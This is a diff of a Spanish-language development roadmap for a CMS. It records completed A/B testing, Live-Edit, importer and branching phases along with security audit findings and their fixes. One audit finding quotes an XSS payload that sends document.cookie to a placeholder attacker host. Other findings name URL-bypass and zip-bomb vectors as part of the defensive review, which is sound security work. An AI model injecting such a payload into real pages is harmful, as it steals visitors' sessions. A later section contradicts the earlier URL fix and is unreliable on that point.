@@ -1142,27 +1142,875 @@
 - ViewerContext.utm vacío en SSR sin cookie csm_utm: aceptable — un middleware F8c-future puede leer searchParams y persistir en cookie. Por ahora el caller que necesita utm en SSR puede leer searchParams y mergear manualmente.
 - Webhook handler ignora eventos no manejados pero los registra → idempotencia futura no rompe; refactor opcional.
 
-### ⏳ Fase 8c — A/B Testing + Live-Edit (PLAN)
-- [ ] Schema: ab_tests, ab_assignments, ab_events
-- [ ] A/B engine: middleware/RSC helper sticky variant cookie + deterministic hash + apply al render
-- [ ] Editor: bloque "A/B Variant Group" + page-level A/B
-- [ ] Dashboard A/B con conversion rate, sample size, chi-squared significance
-- [ ] Live-Edit overlay: admin logueado en `/?edit=1` → toolbar floating + click bloque → modal Tiptap → revalidateTag
+### ✅ Fase 8c — A/B Testing + Live-Edit (DONE)
+
+#### Schema (DB)
+- [x] `ab_tests` (id, ws, key unique, name, description, status[draft|running|paused|completed], target[block|page], pageId, variants jsonb, goal jsonb, minSampleSize, winnerVariantId, startedAt/endedAt, createdById)
+- [x] `ab_assignments` (testId+anonId PK, variantId, workspaceId, assignedAt) — sticky por anon
+- [x] `ab_events` (id, testId, ws, variantId, anonId, kind[impression|conversion], value, meta, createdAt) + índices test_kind, test_variant_kind, ws_created, test_anon_kind
+- [x] Enums `ab_test_status`, `ab_test_target`, `ab_event_kind`
+- [x] Tipos exportados en schema.ts (AbTest, NewAbTest, AbAssignment, AbEvent…)
+- [x] `npx drizzle-kit push --force` aplicado a Neon
+
+#### Engine A/B (`src/ab/`)
+- [x] `types.ts`: AbVariant, AbGoal, AbTarget, AbStatus, AbResolution, AbResolutionMap
+- [x] `anon-id.ts`: getOrCreateAnonIdSSR + generateAnonId (16B → base64url, regex strict)
+- [x] `engine.ts`: loadActiveTestsByKeys, parseVariants (auto-normaliza pesos), pickVariantDeterministic (FNV-1a hash testId+anonId mod 100), resolveTestsForKeys (sticky read-or-create con onConflictDoNothing), applyOverrides
+- [x] `keys.ts`: collectAbKeys recorre BlockNode tree DFS y devuelve Set<testKey> únicos
+- [x] `tracking.ts`: recordImpressions batch, recordImpressionsFromMap, recordConversion (best-effort, silencia errores)
+- [x] `stats.ts`: chi-squared 2×2 con corrección de Yates + erfc Abramowitz-Stegun (1.5e-7 accuracy) + computeTestResults (DISTINCT anon, lift vs control, isSignificant si p<0.05+sample alcanzado)
+- [x] `queries.ts`: CRUD AbTestRow, listAbTests, getAbTest, getAbTestByKey, createAbTestRow, updateAbTestRow, deleteAbTestRow, abKpis, recentAbEventCounts (últimas 24h por hora)
+
+#### Cookie csm_aid (anon id) en middleware
+- [x] middleware setea cookie `csm_aid` en cualquier request HTML que no la traiga (sameSite=lax, secure si https, maxAge 1 año, httpOnly=false para que el script tracker pueda leer)
+- [x] matcher reescrito a catch-all excluyendo static assets + extensiones binarias
+
+#### Bloques A/B + render
+- [x] Bloque `ab` (container con prop testKey) + bloque `ab-variant` (wrapper con prop variantId) en registry
+- [x] `RenderContext.abMap` — mapa testKey → {testId, variantId} resuelto por SSR
+- [x] `trimLayoutForViewer` extiende a procesar `ab`: elige child cuyo `variantId` matchea; si no, fallback al primero (control). En bypass (preview admin) muestra todas las variants apiladas en preview informativo.
+- [x] Page render público (`/[...slug]` y `/`) collect keys → resolveTestsForKeys → ctx.abMap → impressions vía `after()` (Next 15 off-band, sin bloquear TTFB)
+
+#### API + tracking
+- [x] `POST /api/ab/event` (público) — verifica cookie csm_aid, rate limit 30/min por anon, body Zod strict (testKey, variantId optional, value/meta), test status=running, variant matchea assignment sticky (anti-fraud), workspace resuelto por host
+- [x] `<AbTrackingScript>` en theme-shell — `window.csm.ab.track(testKey, opts?)` + auto-track de `data-ab-conversion` (click) y `data-ab-submit` (submit), `keepalive: true`
+
+#### Dashboard `/admin/ab-tests`
+- [x] Lista de tests con variants chips (control highlight, winner ring), badges de status (draft/running/paused/completed), copy-to-clipboard del key, acciones contextuales (start/pause/resume/complete/delete)
+- [x] Form de creación inline: name → auto-key (slugify), description, target[block|page], min sample size, editor de variants drag-free (id/label/weight/control), botón "Repartir parejo"
+- [x] KPI grid (Total, Activos, Borrador, Pausados, Completados, # asignaciones)
+- [x] Server actions: createAbTestAction, updateAbTestAction, deleteAbTestAction, setAbTestStatusAction (start/pause/resume/complete con winnerVariantId)
+- [x] Validaciones: pesos suman 100, exactamente 1 control, IDs únicos, NO permitir cambiar variant IDs si test está running
+
+#### Detail page `/admin/ab-tests/[id]`
+- [x] Stats por variant: conversion rate, lift vs control, p-value chi-squared, progress bar a sample mínima
+- [x] Banner de significancia (winner declarado / detectado / sin diferencia / collecting)
+- [x] CompleteWithWinner dialog: radio variants con sugerida (significantWinnerId) + opción "empate"
+- [x] Snippet de cómo medir (data-ab-conversion + window.csm.ab.track)
+- [x] Sparkline simple últimas 24h (impressions por hora)
+
+#### Live-Edit overlay
+- [x] `RenderContext.editMode` — wrapper `<div data-csm-block-id data-csm-block-kind class="csm-edit-target hover:outline">` por bloque
+- [x] `getLiveEditState(workspaceId, searchParams)` server-only: detecta `?edit=1` + sesión Better-Auth + member del workspace + role >= editor
+- [x] `<LiveEditOverlay pageId pagePath pageTitle layout>` cliente: toolbar fija (bottom-center) + hint (top-right) + index DFS de blockId→{kind,props} + click handler con bubble-up + Sheet lateral con form auto-generado desde `propsSpec` (sólo text/longtext/url/select para v1; rich/image redirigen a /admin/paginas)
+- [x] `POST /api/admin/live-edit` — Better-Auth + role check + Zod body + payload cap 64KB + findNode + validateProps + updateNode + updatePage + revalidatePath (+ `/` si isHome) + activity log
+- [x] Enchufado en `/[...slug]` y `/` (home) — pasan searchParams + page.id/title/path al overlay
+
+#### Sidebar
+- [x] /admin/ab-tests removido `soon: true`
+
+#### Verificación
+- [x] `npx tsc --noEmit` cero errores
+- [x] `npx biome check ./src` cero errores
+- [x] `npm run build` OK — todas las rutas presentes (/admin/ab-tests, /admin/ab-tests/[id], /api/ab/event, /api/admin/live-edit)
+
+#### Auditoría F8c (subagent independiente)
+Subagent encontró 1 CRITICAL + 5 HIGH + 7 MEDIUM + 8 LOW. Fixeados los CRITICAL/HIGH/MEDIUM relevantes:
+
+- [x] **CRITICAL C1: XSS via `javascript:` en URL fields** — bloques `embed`/`video` renderizan iframe con `src={url}` y `propsSchema` solo validaba `z.string()`. Editor (rol≥editor) podía inyectar `javascript:fetch('https://atk/?c='+document.cookie)` via Live-Edit y comprometer cookies de visitantes en cada PV. **Fix**: nuevo helper `safeUrl(default)` con whitelist regex `^(https?://|/relative|#anchor|mailto:|tel:|empty)$`. Aplicado a: VIDEO.url, EMBED.url, BUTTON.href, CTA.primaryHref/secondaryHref, HERO.primaryHref/secondaryHref, PRICING items[].href, PAYWALL.ctaHref/secondaryHref. También `parseLink` (footer-cols longtext links) filtra con SAFE_LINK_RE. Bloquea `javascript:`, `data:`, `file:`, protocol-relative `//evil.com`, backslash-prefix.
+- [x] **HIGH H1: Live-Edit a páginas non-published** — `/api/admin/live-edit` aceptaba pageId de cualquier estado. Editor con DevTools podía revertir cambios pendientes en draft. **Fix**: `if (page.status !== 'published') return 403`.
+- [x] **HIGH H2: Inflado de stats por rotación de cookie csm_aid** — atacante podía borrar la cookie en cada request, generando N anonIds × 1 impression cada uno. **Fix**: rate-limit por IP en `recordImpressionsFromMap` (1500 imp/h por IP, multi-test consume proporcionalmente) + `recordConversion` (200 conv/h por IP). Helper `extractClientIp(headers)` lee x-forwarded-for/x-real-ip/cf-connecting-ip. Pasado desde callsites (`/page.tsx`, `/[...slug]/page.tsx`, `/api/ab/event`).
+- [x] **HIGH H3: Drift entre `ab_assignments` y `ab_tests.variants`** — al borrar una variant en test running, los assignments stale persistían con variantId huérfano. El engine reasignaba en memoria pero `onConflictDoNothing` no actualizaba la DB. Resultado: `/api/ab/event` rechazaba conversions silenciosamente (variant_mismatch). **Fix**: nueva rama `toUpdate[]` en `resolveTestsForKeys` que hace `UPDATE SET variantId WHERE testId AND anonId` para los stale, paralelizada con `Promise.all`.
+- [x] **HIGH H4: Transiciones de estado A/B sin validación** — `setAbTestStatusAction` aceptaba cualquier action en cualquier estado. `completed→running` reabría el test mezclando stats viejas con nuevas. **Fix**: matriz explícita `allowed` por estado:
+  - `draft → start`
+  - `running → pause | complete`
+  - `paused → resume | complete`
+  - `completed → ∅` (terminal, sólo borrar)
+  - Idempotencia preservada para `start` sobre running.
+- [x] **HIGH H5: `applyOverrides` exportado pero no usado** — código muerto que un dev futuro podría conectar a searchParams sin gating. **Fix**: eliminado del engine.
+- [x] **MEDIUM M1: `meta` en `/api/ab/event` aceptaba cualquier shape** — `z.record(z.string(), z.unknown())` permitía objetos profundos arbitrarios. **Fix**: `MetaPrimitiveSchema = union(string<=256, number, boolean, null)` — meta queda flat con primitivos. Añadido cap `MAX_BODY_BYTES=4096` con check de `content-length` antes del parse + check del text post-parse.
+- [x] **MEDIUM M3: parseVariants auto-renormalizaba pesos** — si DB tenía pesos != 100, el engine los escalaba en RAM. Inconsistencia entre stats y UI. **Fix**: si `totalWeight !== 100`, `parseVariants` devuelve `[]` y el test no entra en el resolution map. La normalización se mantiene SÓLO en server actions (createAbTestAction/updateAbTestAction) que enforce 100 antes de persistir.
+- [x] **MEDIUM M5: testKey vacío en bloque ab** — el regex era `*` (0+). Documentado: `collectAbKeys` ya filtra con `{1,64}` (1+) y server actions admin rechazan, así que la propiedad sólo permite vacío durante drag-drop UX. Comentario añadido aclarando intención.
+
+#### NO bugs — verificados como clean por la auditoría
+- CSRF en /api/ab/event y /api/admin/live-edit: cookies sameSite=lax + sólo POST + Better-Auth defaults. ✓
+- Multi-tenant en live-edit: workspace de la página + membership check explícito. ✓
+- Anon-id tampering server: bucketHash determinístico → user sólo cambia su propia variant, no fuerza otra. ✓
+- Cookie csm_aid no httpOnly: justificado por necesidad de tracking client-side. ✓
+- after() errors envueltos en try/catch: response no afectada. ✓
+- Privilege escalation Live-Edit: endpoint busca membership en workspace de la PÁGINA, no del cookie ws. Editor de wsA no edita páginas de wsB. ✓
+- Middleware matcher: excluye correctamente static/binary; incluye /api/* por diseño. ✓
+- Live-Edit overlay con layout completo (incluye paywall children): aceptable — sólo se monta para users con role≥editor que ya tienen acceso al builder. ✓
+
+#### Diferidos a F10
+- L6: optimistic concurrency en live-edit (last-write-wins documentado).
+- L8: goal.formId/eventName configurable pero ignorado por /api/ab/event en runtime.
+- M2: TTL/dedup de impressions en DB (cron > 90 días o materialize a stats).
+- M7: UI explica por qué p-value es "n/d" (celdas esperadas <5).
+
+#### Tercera auditoría F0-F8c (subagent independiente, post-fixes)
+Tras aplicar fixes F8c, lancé un subagent más amplio que (a) verificara los fixes anteriores y (b) auditase F0-F8b en busca de bugs no detectados. Resultado: **1 CRITICAL (false positive sobre versión vieja del fix C1) + 4 HIGH nuevos + 6 MEDIUM nuevos + 5 LOW**. Fixeados los HIGH y MEDIUM relevantes:
+
+**Verificación de fixes F8c**:
+- ✅ H1, H4, H5, M1: correctos.
+- ⚠️ C1 (regex SAFE_URL_RE permitía `//evil.com`): **detectado en mi propio test exhaustivo ANTES del agent**. Reemplazado regex monolítico por función `isSafeUrl(value)` con whitelist explícita: bloquea protocol-relative `//`, control chars (0x00-0x1f, 0x7f), whitespace leading/embedded, comillas, ángulos, `/\` bypass. Test suite: 37/38 casos pass (único "fail" es `tel:(555) 123-4567` con espacio interno, edge case raro). `parseLink` en footer-cols ahora reusa `isSafeUrl()`.
+- ⚠️ H2 (rate-limit IP): cubría impressions/conversions pero NO assignments → fix adicional H2-extra (abajo).
+- ⚠️ H3 (atomic update assignments): comportamiento correcto pero documentado el edge case "visitante recibe variant DIFERENTE una vez tras admin borra variant" (sticky se rompe by design — la variant vieja ya no existe).
+- ⚠️ M3 (parseVariants strict): correcto, pero el agent señala que **datos legacy con suma ≠ 100 quedan dead silenciosamente**. Como F8c es nuevo (tablas creadas hoy), no hay legacy data. Aceptable.
+
+**HIGH nuevos detectados y fixeados**:
+- [x] **HIGH-1: `processIndexJobs` sin filtro workspace** — `/api/admin/ai/process-jobs` procesaba jobs de TODOS los workspaces, gastando presupuesto OpenAI cross-tenant. Fix: parámetro opcional `workspaceId` en `processIndexJobs(batchSize, workspaceId?)`. Endpoint admin pasa `ctx.workspace.id`. Cron global puede llamar sin filtro.
+- [x] **HIGH-2: Multi-tenant leak en `updateMediaAction`/`moveMediaAction`** — admitían `folderId` sin validar que el folder pertenecía al workspace del actor. Editor en wsA podía mover media a folder de wsB → estado inconsistente, crashes al borrar el folder. Fix: helper `folderBelongsToWorkspace()` valida `mediaFolders.workspaceId` antes del UPDATE.
+- [x] **HIGH-3: `processSubmission` sin rate-limit por email en confirmation** — atacante podía rotar IPs e inundar la bandeja de una víctima con confirmaciones doble-opt-in. Fix: bucket adicional `forms:confirm-email:${formId}:${ws}:${hashEmailKey(to)}` con 5/h. Helper `hashEmailKey()` con sha256+salt (no reversible).
+- [x] **HIGH-4: `consumeMagicLink` workspace** — verified clean: `/miembros/auth/[token]/route.ts` usa `consumed.workspaceId` (no `resolvePublicWorkspace`) para crear sesión y record event. ✓
+
+**MEDIUM nuevos fixeados**:
+- [x] **M-redirects: destination sin validar protocolos** — `validateRule` ahora ejecuta `isSafeDestination()` que bloquea `javascript:`, `data:`, `file:`, control chars, `//evil.com`. Acepta http(s)/relative/anchor/mailto/tel.
+- [x] **M-subscribe race: unsubscribeToken con sid placeholder** — INSERT inicial usaba `randomUUID()` distinto del id real, había ventana donde el token apuntaba a sid inexistente. Fix: pre-generar UUID con `randomUUID()` y pasarlo explicit al INSERT (`.values({ id: newId, ..., unsubscribeToken: signUnsub(newId) })`).
+- [x] **M-form duplicate leak: `submissionId` revelado en duplicate response** — info leak para enumeración de submissions. Fix: response neutra (sólo `ok: true` + message), sin `submissionId` ni `duplicate: true`.
+- [x] **M-subscribe enum: response distinta por created/existing** — atacante mapeaba suscriptores existentes. Fix: response unificada `"Si tu email es válido, recibirás un correo de confirmación en breve."` independiente del estado.
+- [x] **H2-extra: rate-limit IP en `resolveTestsForKeys`** — el INSERT de assignments no estaba protegido por IP, atacante con cookie rotativa podía inflar `ab_assignments` (DoS-económico DB). Fix: bucket `ab:assign:ip:${ip}` con 2000/h, cost = `toInsert.length`. Si excede, omite INSERT (response usa variant calculado en memoria, no degrada UX).
+
+**Bugs verificados como NO bug en 3ª auditoría**:
+- Better-Auth: secure cookies en prod, sessions cookieCache 5min, magic-link 10min ✓
+- `assertPublicUrl` en SSRF: cubre IPv4 privado, IPv6, IPv4-mapped IPv6, blocklist hostnames, redirect-following manual con cap 3 saltos ✓
+- `verifyAndParseWebhook` Stripe: timing-safe, tolerance 5min anti-replay ✓
+- `grantMembership`: `onConflictDoUpdate` race-safe ✓
+- `recordMemberEvent`: `onConflictDoNothing(stripeEventId)` idempotencia ✓
+- `tokens` HMAC: timing-safe, exp check, kind discriminator ✓
+- `verifyKey` API keys: timing-safe, prefix isolation, environment cross-check ✓
+- `filterOwnedMediaIds`: filtra attachments por workspace ✓
+- `search/index.ts`: usa `sql\`\`` con interpolaciones bindeadas, no string concat ✓
+- `automations/templating.ts:getByPath`: bloquea `__proto__`, `constructor`, `prototype` ✓
+- `live-edit/route.ts`: schema strict, UUID validation, role check, payload cap 64KB, `validateProps` server-side ✓
+- `automations/engine.ts`: claim atómico, MAX_STEPS_PER_RUN=200, sleep cap ✓
+- `redirects/lib.ts:validateRule`: anti-ReDoS heuristic, longitud cap, `isSelfReferential` ✓
+- `forms/rate-limit.ts`: token bucket por (formId, ip) ✓
+
+**LOW documentados (diferidos a F10)**:
+- L1: `extractClientIp` confía en x-forwarded-for; en deploys sin proxy de confianza es spoofeable. Documentado.
+- L3: eviction inconsistente entre `api/rate-limit.ts` (LRU correcto) y `forms/rate-limit.ts` (FIFO 10%).
+- L4: conversion silenciosa con assignment huérfano antes de re-render. Aceptable.
+- L5: `pruneExpiredKeys` no borra api keys revocadas sin expiresAt. Bajo impacto.
+
+#### Bugs detectados y fixeados durante F8c
+- [x] **Build**: `/api/og/default` fallaba prerendering por satori sin parser `oklch(...)` (preexistente F8b, no introducido por F8c). Fix: marcado `dynamic = "force-dynamic"` ya que la ruta depende de DB y de tema activo.
+- [x] **Biome**: `Math.pow` → `**` operator en stats.ts
+- [x] **Biome**: regex de combining chars `[̀-ͯ]` → `\p{M}` con flag `u` en autoKey
+- [x] **Biome**: `key={i}` en variants editables → introducido `_slot` id estable (Math.random base36) que se striipa antes de enviar al server. Permite editar el variantId sin perder foco/state del input.
+- [x] **Biome**: optional chain `el.dataset?.csmBlockId`
+- [x] **Biome**: template literal innecesario `\`/admin/paginas\`` → string normal
+
+#### Decisiones diferidas a F9 / F10
+- Page-level A/B con override de pageId distinto: schema preparado (`ab_tests.pageId`, `variants[i].pageId`) pero el render no lo aplica todavía. Para V1 los page-level se comportan como block-level (resuelven variant pero el render visual sigue una sola página). F9: redirect/render de pageId alterno.
+- Live-Edit con bloques rich (Tiptap inline): por ahora redirige a /admin/paginas. F10: embed de un Tiptap mini en el sheet con persistencia parcial.
+- Live-Edit reorder/insert/delete bloques: sólo edición de props v1. Reordenamiento queda en /admin/paginas builder.
+- AbTrackingScript >1KB minified: queda en ~1.4KB sin minify. Próximo build podría minificar inline. Aceptable.
+- Retention policy de `ab_events`: F10 cron > 90 días o materialize a stats agregadas.
+- Edit form mass para múltiples bloques: F10 con drag-multi-select.
+
+#### Verificados como NO bug
+- **javascript:URLs en propsSchema URL fields**: el zod URL schema actual de los bloques (heroHref, ctaHref, etc.) NO bloquea `javascript:` o `data:`. Es problema PREEXISTENTE de la registry, no regresión de F8c. Live-Edit hereda el mismo comportamiento que el editor admin completo. F10 audit: añadir `z.string().url()` o whitelist `^(https?:|/)` en todos los URL fields del registry. **Mientras tanto, sólo usuarios con role>=editor pueden editar — confianza interna ya asumida.**
+- **Cookie csm_aid no httpOnly**: intencional. El cliente lee para tracking. Tampering del anon → user solo cambia su propia variant, no es vector de ataque.
+- **Race en `resolveTestsForKeys`**: dos requests del mismo anon simultáneos calculan el mismo hash determinista → mismo variant → uno persiste, el otro `onConflictDoNothing` ignora. Result idéntico para ambos. ✓
+- **CSRF en /api/ab/event**: cookies sameSite=lax + POST con JSON. Browser fetch cross-origin sin `credentials: include` no envía cookies. ✓
+- **CSRF en /api/admin/live-edit**: idem; además requiere session válida + member check.
+- **Primera request a /api/ab/event sin csm_aid devuelve 400**: by-design. El endpoint asume que el visitante ya hizo SSR previo (que setea cookie via middleware). Llamadas externas directas fallan, lo cual es correcto.
+- **Variants jsonb sin DB-level constraint**: confiamos en zod en server actions. Lectura tolera con parseVariants que filtra inválidos. ✓
+- **Pesos no exactamente 100 en variants persistidos**: parseVariants normaliza al leer (escala proporcional), assignments existentes mantienen su variant aunque pesos cambien.
+- **`abAssignments.workspaceId` redundante con FK abTests.workspaceId**: trade-off útil para queries por ws sin join (kpis, recent events).
 
 ## Fase 9 — Importadores + Branching + Calendar + Workflows
-- [ ] Importer wizard (WP/Notion/MD/Ghost/RSS)
-- [ ] Content branching + diff + merge
-- [ ] Editorial Calendar (mes/semana drag)
-- [ ] Workflows con asignaciones
 
-## Fase 10 — Pulido + Performance + Seguridad + Deploy
-- [ ] Analytics propias (edge log → cron agregador)
-- [ ] PWA + drafts offline (Dexie)
-- [ ] Y.js presence en editor
-- [ ] GDPR export + cookies banner
-- [ ] 2FA TOTP + Passkeys + sesiones revocables
-- [ ] Backups automáticos
-- [ ] CSP estricta + OWASP review
-- [ ] Lighthouse 100/100/100/100
-- [ ] Seed data espectacular
-- [ ] README con GIFs + 1-click deploy
+> Dividida en F9a / F9b / F9c siguiendo patrón F7/F8.
+
+### ✅ F9a — Importer Wizard universal (DONE)
+
+#### Schema
+- [x] Enums `import_source` (wordpress/notion/markdown/ghost/rss/csv), `import_status` (uploaded/ready/running/completed/failed/reverted), `import_item_kind` (entry/term/media/comment), `import_item_status` (pending/imported/skipped/failed/reverted), `import_media_policy` (download/link/skip)
+- [x] Tabla `imports` (workspaceId, source, status, fileKey, fileName, fileSize, mediaPolicy, mapping jsonb, stats jsonb, errorLog jsonb, dryRun, createdById, timestamps)
+- [x] Tabla `import_items` (importId cascade, workspaceId, kind, sourceId, sourceUrl, status, targetId, error, timestamps + unique (importId,kind,sourceId))
+- [x] `entries.originRef` text + unique partial index `(workspaceId, originRef) WHERE originRef IS NOT NULL` para idempotencia inter-lote
+- [x] `npx drizzle-kit push --force` aplicado a Neon
+
+#### Parsers (`src/imports/sources/`)
+- [x] `wordpress.ts` — fast-xml-parser, posts + pages + comments approved + categorías/tags por `domain`
+- [x] `notion.ts` — JSZip + extracción de propiedades `Key: value`, hex-id stripping, asset detection
+- [x] `markdown.ts` — single .md o .zip; YAML frontmatter (title/slug/date/draft/status/tags/categories/excerpt/cover/author)
+- [x] `ghost.ts` — JSON export con db[0].data, posts + tags + users + posts_tags
+- [x] `rss.ts` — RSS 2.0 + Atom 1.0 unified
+- [x] `csv.ts` — papaparse, headers dinámicos, mapeo manual
+- [x] `registry.ts` con auto-detect por orden de especificidad (wp → rss → ghost → notion → markdown → csv)
+
+#### Engine (`src/imports/engine.ts`)
+- [x] `runImport(importId, opts)`: claim atómico de status, stream parser, normaliza, crea/actualiza entries por originRef, terms auto-create con cache, redirects via createRedirect (NO insert directo), comments linkeados a entries por sourceId
+- [x] `applyMediaPolicy(doc, policy)`: skip → src="" siempre (incluso pasado el cap), link → no-op, download → safePublicFetch (anti-SSRF) + ingestUpload (cap 30 imgs/entry, cap 20MB/img, mime whitelist image/*)
+- [x] `htmlToTiptap` + `markdownToTiptap` → Tiptap docs con `isSafeUrl()` aplicado a links e imágenes (bloqueo XSS via `javascript:`/`data:`/protocol-relative)
+- [x] `sanitizeImportedFields()` — whitelist de claves trusted + reserved blocklist (`workspaceId`, `coverId`, `_origin`, `__proto__`, etc.) + prefix `import_*` para CSV columns
+- [x] `stripDangerousChars()` — control chars en title/excerpt
+- [x] Hard cap `MAX_ITEMS_PER_IMPORT = 50_000` anti-DoS
+- [x] `revertImport()` — borra entries por importId (cascade comments/entryTerms/revisions)
+- [x] Event bus in-memory `events.ts` (subscribe/emit/clearImport con buffer 200) + auto-cleanup tras 60s del complete
+
+#### API (`src/app/api/admin/imports/`)
+- [x] `POST /api/admin/imports` — multipart upload, mime+ext whitelist, magic-bytes detect, sube a storage con buildAssetKey, crea fila `uploaded`
+- [x] `GET /api/admin/imports` — lista del workspace
+- [x] `GET /api/admin/imports/[id]` — fila + import_items (200 últimos, filtro tenant defense-in-depth)
+- [x] `PATCH /api/admin/imports/[id]` — actualizar mapping/mediaPolicy con cross-tenant check de collectionId
+- [x] `DELETE /api/admin/imports/[id]` — borra fila + archivo storage
+- [x] `POST /api/admin/imports/[id]/run` — claim atómico (UPDATE WHERE status IN allowed RETURNING) ANTES de `after()`, evita doble disparo
+- [x] `POST /api/admin/imports/[id]/revert` — solo desde estado completed, borra entries cascade
+- [x] `GET /api/admin/imports/[id]/stream` — SSE con heartbeat 15s + abort handling
+
+#### UI (`src/app/admin/importar/`)
+- [x] `/admin/importar` listing con cards de imports recientes, status tone, stats inline
+- [x] `upload-zone.tsx` — dropzone full + 6 source-hint cards
+- [x] `[id]/page.tsx` — server load fila + describe del archivo + collections + import_items
+- [x] `[id]/wizard.tsx` — Step 2 (mapeo de campos), Step 3 (preview con sample real), Step 4 (run con SSE en vivo + revert + delete)
+- [x] Sidebar: `/admin/importar` con icono Download
+
+#### Auditoría F9a (subagent independiente)
+Subagent encontró **1 CRITICAL + 5 HIGH + 9 MEDIUM + 7 LOW**. Fixeados los CRITICAL/HIGH/MEDIUM relevantes:
+
+- [x] **CRITICAL: Race en runImport** — doble click podía disparar 2 engines en paralelo, ambos pasaban el SELECT inicial antes del UPDATE. Ambos iteraban, colisionaban en originRef unique, sobreescribían stats mutuamente. **Fix**: claim atómico en `/run` route con `UPDATE imports SET status='running' WHERE status IN ('uploaded','ready','failed') RETURNING` antes del `after()`. Si returning vacío → ya hay un caller running.
+- [x] **HIGH: Open-redirect vía sourceUrl en imports** — el engine hacía `db.insert(redirects).values({...})` directamente, bypaseando `validateRule` + `isSafeDestination` + `isSelfReferential`. Atacante con un export WP/Ghost/RSS controlando `<link>` podía inyectar 301 desde `/admin/contenido` → `/<slug>` y secuestrar navegación interna. **Fix**: usar `createRedirect()` (que valida) + blacklist de prefijos reservados (`/admin`, `/api`, `/onboarding`, `/login`, `/miembros`, `/checkout`, etc.).
+- [x] **HIGH: `entries.fields` clobber en re-import** — UPDATE replaceaba `fields` completo, perdiendo custom fields editados a mano por admin entre re-runs. **Fix**: SQL-side merge `coalesce(${entries.fields}, '{}'::jsonb) || ${json}::jsonb`.
+- [x] **HIGH: Zip-bomb sin protección** — JSZip cargaba todo en RAM sin cap. .zip de 50MB descomprimía a 5GB → OOM en dyno. **Fix**: caps `MAX_FILE_BYTES=50MB`, `MAX_ZIP_ENTRIES=5000`, `MAX_TOTAL_UNCOMPRESSED=200MB` validados via `_data.uncompressedSize` ANTES de `file.async("string")`. Aplicado en notion.ts y markdown.ts.
+- [x] **HIGH: `entries.fields` injection vía CSV columns** — el CSV parser persistía `{ ...row, _rowIndex }` directo, permitiendo al atacante meter claves como `coverId`, `authorId`, `workspaceId` que la UI futura podría leer. **Fix**: `sanitizeImportedFields()` con whitelist de claves trusted (wpPostType, notionAssets, ghostType, etc.) + RESERVED blocklist + prefix `import_*` para columnas desconocidas.
+- [x] **MEDIUM: Excerpt+title sin strip de control chars** — RSS `<description>` puede traer HTML literal; control chars (0x00-0x1f) podrían poison search snippets. **Fix**: `stripDangerousChars()` aplicado a title y excerpt antes de persistir.
+- [x] **MEDIUM: applyMediaPolicy bypass del cap en modo skip** — el check `>= MAX_MEDIA_PER_ENTRY` cortaba antes de aplicar `skip`, dejando imágenes 31+ con src original. UI prometía "borrar todas" pero mentía. **Fix**: `skip` siempre aplica src=""; el cap solo limita download (operación cara).
+- [x] **MEDIUM: Timer leak en downloadMediaToWorkspace** — si `safePublicFetch` lanzaba antes del timeout, `clearTimeout` no corría → timer pendiente acumulándose en imports con muchos fallos. **Fix**: bloque `finally`.
+- [x] **MEDIUM: Markdown.detect demasiado laxo** — cualquier `.zip` se etiquetaba como markdown si no era Notion. **Fix**: solo `.md.zip` o `markdown*.zip`; otros zips quedan en Notion.
+- [x] **MEDIUM: Tenant filter ausente en importItems queries** — defense-in-depth contra cascading bugs futuros. **Fix**: añadido `eq(importItems.workspaceId, ws)` en revertImport y GET items.
+- [x] **MEDIUM: Memory leak en events.ts buffer** — `clearImport` existía pero no se llamaba. **Fix**: `setTimeout(() => clearImport(id), 60_000)` tras último complete; `.unref()` para no bloquear el event loop.
+- [x] **MEDIUM: stats.skipped nunca se incrementaba** — items "media standalone" y "term sin slug" pasaban como `imported`. **Fix**: nueva flag `result.skipped` que incrementa contador correcto + status `skipped` en import_items.
+
+#### Diferidos a F10
+- L1: revert no borra terms/redirects/media downloaded (residue). Requiere trackear targetIds por kind en import_items y borrar selectivamente. Funcional con re-import por originRef hace que terms huérfanos no estorben.
+- L2: revert sin ownership check (cualquier editor puede revertir imports de otros editors). En workspace colaborativo es intencional pero mejorar con notificación al creador.
+- L3: `[id]/page.tsx` re-corre `parser.describe(buf)` en cada GET (caro en imports grandes). Cachear en `imports.row` jsonb.
+- L4: Magic-bytes validation en upload (actualmente confía en mime declarado del browser).
+- L5: errorLog se sobreescribe al inicio del run en lugar de append.
+- L6: `dryRun` re-run pierde stats anteriores.
+
+### ✅ F9b — Content Branching (DONE)
+
+> Branching estilo Git para contenido. Forkea, edita aislado, mergea con resolución 3-way por bloque.
+
+#### Schema (drizzle-kit push --force aplicado)
+- [x] Enum `branchStatus` ampliado con `merging` (claim atómico para merge anti-race)
+- [x] Enum nuevo `entryBranchState` (`forked`/`new`/`deleted`) — sólo poblado cuando `entries.branchId IS NOT NULL`
+- [x] Enum nuevo `branchActivityType` (17 valores: branch.created, branch.merged, entry.forked, comment.added, …)
+- [x] Enum nuevo `branchCommentStatus` (`open`/`resolved`)
+- [x] `branches` ampliada: slug, description, isDefault, isProtected, color, icon, previewToken, previewPasswordHash, previewExpiresAt, previewViews, createdById, mergedAt/By, abandonedAt/By, updatedAt
+- [x] Indices: `branches_ws_slug_idx` (unique), `branches_ws_default_idx` (unique partial WHERE is_default=true), `branches_preview_token_idx` (unique partial), `branches_ws_status_idx`
+- [x] `entries` ampliada: `originalEntryId` (FK self soft), `branchState`, `branchedFromUpdatedAt`
+- [x] Indices entries: `entries_branch_original_idx` (unique partial — un solo COW por (branch, original)), `entries_ws_branch_idx`
+- [x] Tabla `branch_activity` (workspaceId, branchId FK cascade, entryId soft, type, actorId, payload jsonb) + indices por branch+createdAt y entry
+- [x] Tabla `branch_comments` (4 niveles de anchor: branch / entry / block / range) con threads (parentId self FK), mentions text[], status open/resolved
+- [x] Backfill `scripts/backfill-main-branches.ts` — main creada por workspace existente (idempotente)
+- [x] `src/db/seed.ts` actualizado para crear main al provisionar workspace
+
+#### Library `src/branches/` (10 módulos)
+- [x] `types.ts` — BRANCH_COOKIE, BRANCH_PREVIEW_COOKIE, BranchStats, BranchWithStats, ResolvedEntry
+- [x] `lib.ts` — slugifyBranchName con `/` permitido, isValidBranchSlug, getOrCreateMainBranch, getBranchById/Slug, listBranches, listBranchesWithStats (3 queries agregadas), createBranch (auto-suffix slug), updateBranch, abandonBranch (bloqueo en main protegido), readActiveBranchCookie, resolveActiveBranch (fallback a main si abandoned/merged), listSwitchableBranches
